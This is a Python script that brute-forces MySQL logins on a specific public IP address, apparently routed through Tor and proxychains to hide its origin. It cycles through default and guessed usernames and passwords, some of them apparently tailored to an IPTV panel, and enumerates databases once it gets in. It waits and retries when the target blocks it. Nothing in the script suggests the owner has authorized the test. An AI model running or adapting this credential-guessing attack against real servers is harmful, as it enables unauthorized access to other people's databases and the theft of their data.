#!/usr/bin/env python3
"""Test MySQL credentials on 186.194.52.218:3306 via Tor/proxychains"""
import sys
import time

# Try both pymysql and mysql.connector
creds = [
    ("root", ""),
    ("root", "root"),
    ("root", "admin"),
    ("root", "mysql"),
    ("root", "password"),
    ("root", "toor"),
    ("root", "123456"),
    ("root", "12345678"),
    ("root", "P@ssw0rd"),
    ("root", "changeme"),
    ("root", "painel"),
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("mysql", "mysql"),
    ("mysql", "root"),
    ("painel", "painel"),
    ("painel", "admin"),
    ("user", "user"),
    ("test", "test"),
    ("elite", "elite"),
    ("eliteiptv", "eliteiptv"),
]

# Try pymysql first
for user, password in creds:
    try:
        import pymysql
        conn = pymysql.connect(
            host="186.194.52.218",
            port=3306,
            user=user,
            password=password,
            connect_timeout=15,
            read_timeout=15,
        )
        cur = conn.cursor()
        cur.execute("SELECT VERSION()")
        version = cur.fetchone()
        cur.execute("SELECT USER(), CURRENT_USER()")
        user_info = cur.fetchone()
        print(f"[+] SUCCESS: {user}:{password} -> Version: {version[0]}, User: {user_info}")
        
        # Try to enumerate
        try:
            cur.execute("SHOW DATABASES")
            dbs = cur.fetchall()
            print(f"[+] Databases: {[db[0] for db in dbs]}")
        except:
            pass
        
        conn.close()
        sys.exit(0)
    except ImportError:
        break
    except pymysql.err.OperationalError as e:
        code = e.args[0]
        if code == 1045:
            print(f"[-] {user}:{password} -> Access denied")
        elif code == 2003:
            print(f"[!] {user}:{password} -> Connection refused (IP blocked), waiting 10s...")
            time.sleep(10)
        elif code == 2002:
            print(f"[!] {user}:{password} -> Socket error, waiting 10s...")
            time.sleep(10)
        else:
            print(f"[!] {user}:{password} -> Error {code}: {e}")
    except Exception as e:
        print(f"[!] {user}:{password} -> Exception: {e}")
    
    time.sleep(2)

print("[-] No valid credentials found with pymysql")